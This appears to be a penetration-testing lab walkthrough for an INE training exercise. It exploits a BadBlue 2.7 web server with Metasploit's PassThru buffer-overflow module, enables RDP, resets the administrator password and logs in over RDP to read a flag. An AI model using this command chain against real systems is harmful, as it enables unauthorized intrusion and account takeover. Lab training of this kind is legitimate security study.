---
title: BadBlue
description: 'PORT: 80 Version: badblue httpd 2.7'
date: '2026-10-26'
topics:
  - systems
section:
  - Systems
  - Window
order: 102
---
## Exploitation


### With Metasploit

```
nmap -Pn -sS -sVC demo.ine.local
```

![](/notes/img/pasted-image-20251019113740.png)

PORT: 80
Version: badblue httpd 2.7

```
search badblue 2.7
```

![](/notes/img/pasted-image-20251019113844.png)

```
use exploit/windows/http/badblue_passthru
```

![](/notes/img/pasted-image-20251019114009.png)


## exploitation

**Step 1:** Open the lab link to access the Kali machine.

[Content Image](https://assets.ine.com/lab/learningpath/a7848736e59f3ca3338c47dadd8bba4395d3f7da28673ddb2c407289ec9241fc.jpg)

**Step 2:** Check if the target machine is reachable:

**Command:**

```
ping -c 4 demo.ine.local
```

[Content Image](https://assets.ine.com/lab/learningpath/e55e02a5a42cd3fbcd2253c6bb53780dcbc5081876bcc6634828db905096ea64.jpg)

The target is reachable.

**Step 3:** Run an Nmap scan against the target:

**Command:**

```
nmap demo.ine.local
```

[Content Image](https://assets.ine.com/lab/learningpath/5acb252dce8d6cabe3342e653bff34f1a052365ff949bf0125340235dc69c722.jpg)

**Note:** The RDP default port is not exposed - 3389.

**Step 4:** We have discovered that multiple ports are open. We will run nmap again to determine version information on port 80.

**Command:**

```
nmap -sV -p 80 demo.ine.local
```

[Content Image](https://assets.ine.com/lab/learningpath/d248e8298e37acd8faef002e25f2a7e5971689eb1a10c05cc3642995ada52674.jpg)

**BadBlue 2.7** is running on the target.

**Step 5:** We will search the exploit module for badblue 2.7 using searchsploit.

**Command:**

```
searchsploit badblue 2.7
```

[Content Image](https://assets.ine.com/lab/learningpath/753a52fd5eec51a9d2d98528365c92d1132f368043a9b8987c77b4c9eb1184b5.jpg)

**Step 6:** There is a metasploit module for badblue server. We will use PassThru remote buffer overflow metasploit module to exploit the target.

**Commands:**

```
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit
```

[Content Image](https://assets.ine.com/lab/learningpath/d05ea03b37545b2b07fc05b6bad1c79750bc8810e48f3807e2836565742304a6.jpg)

We have successfully exploited the target vulnerable application (badblue) and received a meterpreter shell.

Background the session.

**Step 7:** Enabling the RDP service using windows post exploitation module.

**Commands:**

```
use post/windows/manage/enable_rdp
set SESSION 1
exploit
```

[Content Image](https://assets.ine.com/lab/learningpath/d5dfe7bd96742031128179aac1d7b14c4a66da87ef58c7df42933284f6b103c4.jpg)

The post exploit worked fine. Re-running nmap to check if RDP port is exposed or not.

**Command:**

```
nmap demo.ine.local
```

[Content Image](https://assets.ine.com/lab/learningpath/d4327e545d789413e9520bc562d7375f55add81dcaf418277c4c9496d6af9c13.jpg)

The RDP port 3389 is exposed.

**Step 8:** Interact with the meterpreter shell and change the administrator password.

**Commands:**

```
sessions -i 1
shell
net user administrator hacker_123321
```

[Content Image](https://assets.ine.com/lab/learningpath/fb4dfccbeec1131d1f502903afb6c1812ab30c5b3ef27ade4170c18c92185044.jpg)

**Step 9:** Connect to the RDP service using xfreerdp utility and administrator account.

**Command:**

```
xfreerdp /u:administrator /p:hacker_123321 /v:demo.ine.local

Y
```

[Content Image](https://assets.ine.com/lab/learningpath/273dd1428832472f7b222f0a783b257be7faf59c8eca17b29bf3ac08d4676995.jpg)

**Step 10:** Reading the flag.txt file which is present on the Desktop of the Administrator user.

[Content Image](https://assets.ine.com/lab/learningpath/8173230ab467275078467b3695eec62292bfa9820042150306417af4bfeb3de4.jpg)

This reveals the flag to us.

**Flag:** 763e1c86da26c66e86a8537fd343280d
